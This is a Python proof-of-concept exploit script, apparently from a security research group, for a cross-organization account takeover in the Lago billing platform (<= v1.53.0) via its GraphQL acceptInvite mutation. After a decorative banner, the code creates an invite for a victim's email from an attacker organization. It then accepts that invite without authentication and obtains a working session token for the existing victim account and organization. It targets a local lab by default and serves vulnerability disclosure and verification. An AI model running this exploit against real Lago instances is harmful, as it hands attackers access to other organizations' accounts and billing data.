#!/usr/bin/env python3
######################################################################################
#
#        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.
#       d88888 888  "88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b
#      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.
#     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  "Y888b.
#    d88P  888 888  "Y88b 8888888P"     d88P  888    d888b       d88P  888     "Y88b.
#   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       "888
#  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P
# d88P     888 8888888P"  888   T88b d88P     888 d88P   Y88b d88P     888  "Y8888P"
#
#                     888             d8888 888888b.    .d8888b.
#                     888            d88888 888  "88b  d88P  Y88b
#                     888           d88P888 888  .88P  Y88b.
#                     888          d88P 888 8888888K.   "Y888b.
#                     888         d88P  888 888  "Y88b     "Y88b.
#                     888        d88P   888 888    888       "888
#                     888       d8888888888 888   d88P Y88b  d88P
#                     88888888 d88P     888 8888888P"   "Y8888P"
#
#  Website : https://abraxaslabs.tech
#  GitHub  : https://github.com/abraxas
#  Twitter : @abraxas_null
#
#  CVE: lago-invite-ato (Critical: 9.6)
#  Vendor: Lago (GetLago)
#  Versions: Lago <= v1.53.0
#  Impact: Cross-organization account takeover
#  Requires: authenticated POST /graphql
#
######################################################################################
#
#  RESEARCH / EDUCATIONAL USE ONLY.
#  Do not run, deploy, or use this material against any host unless you have
#  explicit written permission from both the party hosting this repository
#  and the owner of the target systems.
#
######################################################################################

import os as _os
import shutil as _shutil
import sys as _sys
import builtins as _builtins

_ART = {"abraxas": ["        d8888 888888b.   8888888b.         d8888 Y88b   d88P        d8888  .d8888b.", "       d88888 888  \"88b  888   Y88b       d88888  Y88b d88P        d88888 d88P  Y88b", "      d88P888 888  .88P  888    888      d88P888   Y88o88P        d88P888 Y88b.", "     d88P 888 8888888K.  888   d88P     d88P 888    Y888P        d88P 888  \"Y888b.", "    d88P  888 888  \"Y88b 8888888P\"     d88P  888    d888b       d88P  888     \"Y88b.", "   d88P   888 888    888 888 T88b     d88P   888   d88888b     d88P   888       \"888", "  d8888888888 888   d88P 888  T88b   d8888888888  d88P Y88b   d8888888888 Y88b  d88P", " d88P     888 8888888P\"  888   T88b d88P     888 d88P   Y88b d88P     888  \"Y8888P\""], "labs": ["                     888             d8888 888888b.    .d8888b.", "                     888            d88888 888  \"88b  d88P  Y88b", "                     888           d88P888 888  .88P  Y88b.", "                     888          d88P 888 8888888K.   \"Y888b.", "                     888         d88P  888 888  \"Y88b     \"Y88b.", "                     888        d88P   888 888    888       \"888", "                     888       d8888888888 888   d88P Y88b  d88P", "                     88888888 d88P     888 8888888P\"   \"Y8888P\""]}
_CVE = "lago-invite-ato"
_SITE = "https://abraxaslabs.tech"
_GH = "https://github.com/abraxas"
_XURL = "https://x.com/abraxas_null"
_XH = "@abraxas_null"
_RST = "\033[0m"
_BLD = "\033[1m"


def _on():
    return not _os.environ.get("NO_COLOR")


def _rgb(r, g, b):
    return f"\033[38;2;{r};{g};{b}m" if _on() else ""


_RAIN = [
    (255, 77, 224), (255, 0, 212), (191, 95, 255), (91, 140, 255),
    (0, 210, 255), (0, 255, 249), (57, 255, 20), (180, 255, 70),
    (255, 230, 0), (255, 201, 70), (255, 122, 24), (255, 64, 96),
]


def _lerp(a, b, t):
    return tuple(int(a[i] + (b[i] - a[i]) * t) for i in range(3))


def _rain(x, width):
    if width <= 1:
        return _RAIN[0]
    t = (x / (width - 1)) * (len(_RAIN) - 1)
    i = min(int(t), len(_RAIN) - 2)
    return _lerp(_RAIN[i], _RAIN[i + 1], t - i)


def _logo_line(line, y, n):
    width = max(len(line), 1)
    out = []
    q = False
    for x, ch in enumerate(line):
        if ch == " ":
            out.append(ch)
            continue
        if ch == '"':
            q = not q
            out.append(_rgb(*(255, 201, 70) if q else (255, 230, 0)) + ch)
            continue
        if q:
            out.append(_rgb(255, 230, 0) + ch)
            continue
        r, g, b = _rain(x, width)
        out.append(_rgb(r, g, b) + ch)
    return "".join(out) + _RST


def print_abraxas_banner():
    cols = _shutil.get_terminal_size((120, 30)).columns
    art = _ART["abraxas"] + _ART["labs"]
    art_w = max(len(x) for x in art)
    content_w = min(max(art_w, 88), max(cols - 4, 40))
    box_w = content_w + 4
    if box_w > cols:
        content_w = max(cols - 4, 20)
        box_w = content_w + 4
    cyan, mag = _rgb(0, 255, 249), _rgb(255, 0, 212)
    top = cyan + "╔" + "═" * (box_w - 2) + "╗" + _RST
    mid = mag + "╠" + "═" * (box_w - 2) + "╣" + _RST
    bot = cyan + "╚" + "═" * (box_w - 2) + "╝" + _RST

    def row(vis, rendered, border):
        return _rgb(*border) + "║" + _RST + " " + rendered + _RST + " " + _rgb(*border) + "║" + _RST

    lines = [top]
    title_l, title_r = " ABRAXAS LABS", "analyze · reverse · disclose"
    gap = max(content_w - len(title_l) - len(title_r), 1)
    title = (title_l + " " * gap + title_r)[:content_w].ljust(content_w)
    cells = []
    split, rstart = len(title_l), content_w - len(title_r)
    for i, ch in enumerate(title):
        if ch == " ":
            cells.append(ch)
        elif i < split:
            cells.append(_rgb(0, 255, 249) + _BLD + ch)
        elif i >= rstart:
            cells.append(_rgb(140, 155, 175) + ch)
        else:
            cells.append(ch)
    lines.append(row(title, "".join(cells) + _RST, (0, 255, 249)))
    lines.append(mid)
    cve_l = " " + _CVE
    cve_r = "authorized research only"
    rest = max(content_w - len(cve_l) - len(cve_r), 3)
    midtxt = " local lab ".center(rest)[:rest]
    cve_line = (cve_l + midtxt + cve_r)[:content_w].ljust(content_w)
    cells = []
    le, rs = len(cve_l), content_w - len(cve_r)
    for i, ch in enumerate(cve_line):
        if ch == " ":
            cells.append(ch)
        elif i < le:
            cells.append(_rgb(255, 77, 224) + _BLD + ch)
        elif i >= rs:
            cells.append(_rgb(57, 255, 20) + ch)
        else:
            cells.append(_rgb(255, 0, 212) + ch)
    lines.append(row(cve_line, "".join(cells) + _RST, (255, 0, 212)))
    lines.append(mid)
    n = len(_ART["abraxas"])
    for y, line in enumerate(_ART["abraxas"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    for y, line in enumerate(_ART["labs"]):
        vis = line[:content_w].ljust(content_w)
        lines.append(row(vis, _logo_line(vis, y, n), (255, 0, 212)))
    lines.append(mid)
    for left, right in (("Website", _SITE), ("GitHub", _GH), ("X", _XH + "  " + _XURL)):
        gap = max(content_w - 1 - len(left) - len(right), 1)
        vis = (" " + left + " " * gap + right)[:content_w].ljust(content_w)
        out = []
        left_end = 1 + len(left)
        right_start = content_w - len(right)
        for i, ch in enumerate(vis):
            if ch == " ":
                out.append(ch)
            elif i < left_end:
                out.append(_rgb(255, 230, 0) + ch)
            elif i >= right_start:
                out.append(_rgb(0, 255, 249) + ch)
            else:
                out.append(ch)
        lines.append(row(vis, "".join(out) + _RST, (255, 0, 212)))
    lines.append(bot)
    status = "[*]  abraxas!null ready on #labs   ·   " + _SITE
    scol = []
    for ch in status:
        if ch == " ":
            scol.append(ch)
        elif ch in "[]*":
            scol.append(_rgb(57, 255, 20) + ch)
        elif ch in "·#":
            scol.append(_rgb(255, 77, 224) + ch)
        else:
            scol.append(_rgb(232, 255, 248) + ch)
    lines.append(" " + "".join(scol) + _RST)
    _sys.stdout.write("\n".join(lines) + "\n\n")
    _sys.stdout.flush()


def _cprint(*args, **kwargs):
    sep = kwargs.get("sep", " ")
    s = sep.join(str(a) for a in args)
    low = s.lower()
    if s.startswith("SUCCESS") or "success" == low[:7]:
        col = _rgb(57, 255, 20) + _BLD
    elif s.startswith("FAIL") or low.startswith("fail"):
        col = _rgb(255, 64, 96) + _BLD
    elif "user_id" in low:
        col = _rgb(255, 201, 70) + _BLD
    elif low.startswith("status=") or "status=" in low[:20]:
        col = _rgb(0, 255, 249)
    elif low.startswith("carrier"):
        col = _rgb(255, 0, 212)
    elif s.lstrip().startswith("{") or s.lstrip().startswith("["):
        col = _rgb(255, 230, 0)
    else:
        col = _rgb(232, 255, 248)
    kwargs = dict(kwargs)
    file = kwargs.get("file", _sys.stdout)
    if file is _sys.stdout or file is _sys.stderr:
        _builtins.print(col + s + _RST, **{k: v for k, v in kwargs.items() if k != "sep"})
    else:
        _builtins.print(*args, **kwargs)


print_abraxas_banner()
_builtins.print = _cprint

"""Local GraphQL oracle for Lago v1.53.0 acceptInvite ATO.

Does not touch a mailbox. Does not change the victim password.
Witness last line: SUCCESS LAGO-INVITE-ATO ...
"""

import json
import os
import sys
import urllib.error
import urllib.request
import uuid
from dataclasses import dataclass
from typing import Any, NoReturn

DEFAULT_API = "http://127.0.0.1:13000"
GRAPHQL_PATH = "/graphql"
HTTP_TIMEOUT_S = 30
LABEL = "LAGO-INVITE-ATO"
VICTIM_PASSWORD = "ILoveLago-Victim-1"
ATTACKER_PASSWORD = "ILoveLago-Attacker-1"
DUMMY_PASSWORD = "this-password-is-not-the-victim-password"

REGISTER = """
mutation($input: RegisterUserInput!) {
  registerUser(input: $input) {
    token
    user { id email }
    organization { id name }
  }
}
"""

LOGIN = """
mutation($input: LoginUserInput!) {
  loginUser(input: $input) {
    token
    user { id email organizations { id name } }
  }
}
"""

CREATE_INVITE = """
mutation($input: CreateInviteInput!) {
  createInvite(input: $input) {
    id
    token
    email
    roles
  }
}
"""

ACCEPT = """
mutation($input: AcceptInviteInput!) {
  acceptInvite(input: $input) {
    token
    user { id email }
  }
}
"""

ME = """
query {
  currentUser {
    id
    email
    organizations { id name }
  }
}
"""

ORG = """
query {
  organization { id name }
}
"""


@dataclass(frozen=True)
class LabConfig:
    api: str
    suffix: str

    @property
    def graphql_url(self) -> str:
        return f"{self.api.rstrip('/')}{GRAPHQL_PATH}"

    @property
    def victim_email(self) -> str:
        return f"victim-{self.suffix}@lab.local"

    @property
    def victim_org(self) -> str:
        return f"Victim Corp {self.suffix}"

    @property
    def attacker_email(self) -> str:
        return f"attacker-{self.suffix}@lab.local"

    @property
    def attacker_org(self) -> str:
        return f"Attacker Corp {self.suffix}"


def fail(reason: str) -> NoReturn:
    print(f"FAIL {reason}")
    raise SystemExit(1)


def load_config(argv: list[str]) -> LabConfig:
    api = argv[1] if len(argv) > 1 else DEFAULT_API
    suffix = os.environ.get("LAGO_POC_SUFFIX") or uuid.uuid4().hex[:8]
    return LabConfig(api=api, suffix=suffix)


def gql(
    url: str,
    query: str,
    variables: dict[str, Any] | None = None,
    token: str | None = None,
    org: str | None = None,
) -> dict[str, Any]:
    body = json.dumps({"query": query, "variables": variables or {}}).encode("utf-8")
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if org:
        headers["x-lago-organization"] = org
    request = urllib.request.Request(url, data=body, headers=headers, method="POST")
    try:
        with urllib.request.urlopen(request, timeout=HTTP_TIMEOUT_S) as response:
            payload: Any = json.loads(response.read().decode("utf-8"))
    except urllib.error.HTTPError as exc:
        raw = exc.read().decode("utf-8", "replace")
        fail(f"http {exc.code} {raw[:500]}")
    if not isinstance(payload, dict):
        fail(f"non-object graphql response {str(payload)[:800]}")
    return payload


def require_path(payload: dict[str, Any], *path: str) -> Any:
    current: Any = payload.get("data") or {}
    for key in path:
        if not isinstance(current, dict) or key not in current:
            fail(f"missing {'/'.join(path)} in {json.dumps(payload)[:800]}")
        current = current[key]
    return current


def register_user(
    url: str,
    email: str,
    password: str,
    organization_name: str,
    who: str,
) -> dict[str, Any]:
    payload = gql(
        url,
        REGISTER,
        {
            "input": {
                "email": email,
                "password": password,
                "organizationName": organization_name,
            }
        },
    )
    if payload.get("errors"):
        fail(f"register {who} {json.dumps(payload['errors'])[:800]}")
    return payload


def main() -> int:
    cfg = load_config(sys.argv)
    url = cfg.graphql_url
    print(f"IOC graphql={url}")
    print(f"IOC suffix={cfg.suffix} victim_email={cfg.victim_email}")

    victim = register_user(
        url, cfg.victim_email, VICTIM_PASSWORD, cfg.victim_org, "victim"
    )
    victim_org = require_path(victim, "registerUser", "organization", "id")
    victim_user = require_path(victim, "registerUser", "user", "id")
    print(f"IOC victim_org={victim_org} victim_user={victim_user}")

    attacker = register_user(
        url, cfg.attacker_email, ATTACKER_PASSWORD, cfg.attacker_org, "attacker"
    )
    attacker_token = require_path(attacker, "registerUser", "token")
    attacker_org = require_path(attacker, "registerUser", "organization", "id")
    print(f"IOC attacker_org={attacker_org}")

    invite = gql(
        url,
        CREATE_INVITE,
        {"input": {"email": cfg.victim_email, "roles": ["finance"]}},
        token=attacker_token,
        org=attacker_org,
    )
    if invite.get("errors"):
        fail(f"createInvite {json.dumps(invite['errors'])[:800]}")
    invite_token = require_path(invite, "createInvite", "token")
    print(f"IOC invite_token_len={len(invite_token)}")

    # Unauthenticated accept. Dummy password. No mailbox.
    accepted = gql(
        url,
        ACCEPT,
        {
            "input": {
                "email": cfg.victim_email,
                "password": DUMMY_PASSWORD,
                "token": invite_token,
            }
        },
    )
    if accepted.get("errors"):
        fail(f"acceptInvite {json.dumps(accepted['errors'])[:800]}")
    ato_token = require_path(accepted, "acceptInvite", "token")
    ato_user = require_path(accepted, "acceptInvite", "user", "id")
    ato_email = require_path(accepted, "acceptInvite", "user", "email")
    print(f"IOC accept_user={ato_user} accept_email={ato_email}")

    if ato_user != victim_user:
        fail("acceptInvite minted a different user than the existing victim")
    if ato_email != cfg.victim_email:
        fail("acceptInvite email mismatch")

    me = gql(url, ME, token=ato_token)
    if me.get("errors"):
        fail(f"currentUser {json.dumps(me['errors'])[:800]}")
    orgs = require_path(me, "currentUser", "organizations")
    org_ids = {item["id"] for item in orgs}
    org_names = {item["name"] for item in orgs}
    print(f"IOC orgs={sorted(org_names)}")

    if victim_org not in org_ids:
        fail("victim org missing from ATO JWT organizations")
    if attacker_org not in org_ids:
        fail("attacker org missing (invite membership not attached)")

    switched = gql(url, ORG, token=ato_token, org=victim_org)
    if switched.get("errors"):
        fail(f"organization switch {json.dumps(switched['errors'])[:800]}")
    switched_name = require_path(switched, "organization", "name")
    if switched_name != cfg.victim_org:
        fail(f"switched org name={switched_name}")
    print(f"IOC switched_org={switched_name}")

    # Victim password must still work; dummy password from accept must not.
    bad_login = gql(
        url,
        LOGIN,
        {"input": {"email": cfg.victim_email, "password": DUMMY_PASSWORD}},
    )
    if not bad_login.get("errors"):
        fail("dummy password logged in as victim (password was overwritten)")
    print("IOC victim_password_unchanged")

    good_login = gql(
        url,
        LOGIN,
        {"input": {"email": cfg.victim_email, "password": VICTIM_PASSWORD}},
    )
    if good_login.get("errors"):
        fail(f"victim real password rejected {json.dumps(good_login['errors'])[:800]}")
    print("IOC victim_real_password_still_works")

    print(
        f"SUCCESS {LABEL} acceptInvite JWT is existing victim; lists {cfg.victim_org}; no inbox"
    )
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
